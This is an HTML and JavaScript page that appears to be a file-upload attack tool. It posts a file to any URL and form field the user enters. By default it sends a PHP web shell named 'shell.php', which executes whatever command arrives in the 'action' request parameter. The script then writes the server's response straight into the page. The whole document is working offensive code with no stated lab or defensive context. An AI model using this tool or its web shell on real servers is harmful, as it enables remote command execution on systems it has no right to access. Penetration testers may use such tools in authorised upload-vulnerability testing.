<html lang="en"> 
    <head> 
        <meta charset="UTF-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>
        </title>
    </head>
    <body>
        <div style="display:flex;">
            <div style="width:50%">
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">URL</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="text" id="formurl">
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">FORM FIELD</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="text" id="formparam">
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">FILE CONTENT</label>
                    <textarea style="width:100%;margin-block:4px;padding:4px" type="text" id="formfilecontent"></textarea>
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">FILE CONTENT NAME</label>
                    <textarea style="width:100%;margin-block:4px;padding:4px" type="text" id="formfilecontentname"></textarea>
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">FILE CONTENT MIME</label>
                    <textarea style="width:100%;margin-block:4px;padding:4px" type="text" id="formfilecontentmime"></textarea>
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">UPLOAD FILE</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="file" id="formuploadfile">
                </div>
                <div>
                    <button onclick='upload()' style="width:100%;margin-block:4px;padding:4px">TEST</button>
                </div>
            </div>
            <div style="width:50%;overflow:scroll; padding:22px" id="render">
                <pre>
                </pre>
            </div>
        </div>
        <script> 
            const post = (req, data, cb) => {
                data = formdata(data) 
                req.onload = cb 
                req.send(data)
            }
            const formdata = (data) => {
                let _formData = new FormData()
                Object.keys(data).map(key => {
                    _formData.append(key, data[key])
                })
                return _formData
            }
            const formparams = (data) => {
                let _formData = ""
                Object.keys(data).map(
                    (key, idx) => {
                        _formData += (idx > 0) ? "&" : "?"
                        _formData += `${key}=${data[key]}`
                    }
                )
                return _formData
            }
            const custom_req = (url) => {
                let _req = new XMLHttpRequest()
                return {
                    upload: (data, cb) => {
                        _req.open('POST', url)
                        post(_req, data, cb)
                    },
                    req: _req
                }
            }

            function elem(selector) 
            {
                return document.querySelector(selector)
            }

            function elems(selector) 
            {
                return document.querySelectorAll(selector)
            }

            function upload() 
            {
                const url                   = elem("#formurl").value ?? null
                let param                   = elem("#formparam").value ?? null
                let uploadfile              = elem("#formuploadfile").files[0] ?? null
                let filecontent             = elem("#formfilecontent").value ? elem("#formfilecontent").value : (!uploadfile ? ("<?php echo "<?php \$action = \$_REQUEST['action'] ; if(\$action){system(\$action);}else{echo 'no action';}?>"; ?>") : null )
                let filecontentname         = elem("#formfilecontentname").value ? elem("#formfilecontentname").value : (!uploadfile ? ("shell.php") : null )
                let filecontentmime         = elem("#formfilecontentmime").value ? elem("#formfilecontentmime").value : (!uploadfile ? ("application/x-php") : null )
                console.info(url,param,uploadfile,filecontent,filecontentname,filecontentmime)
                injection(url,param,uploadfile,filecontent,filecontentname,filecontentmime)
            }

            function injection(url, param ,uploadfile,filecontent,filecontentname,filecontentmime) 
            {
                
                if(filecontent)
                // if(filecontent && !uploadfile)
                {
                    if (filecontent) {
                        uploadfile = new File(
                            [filecontent],
                            filecontentname,
                            { type: filecontentmime }
                        );
                    }
                }
                if (url && param ) 
                {
                    elem("#render").innerHTML = ``
                    const params    = {}
                    params[param] = uploadfile
                    const req = custom_req(url) 
                    console.info(params)
                    req.upload(params, res => {
                        elem("#render").innerHTML += `<h2>${param} upload</h2><div>${req.req.response}</div>`
                    })
                }
            }

            </script>
    </body>
</html>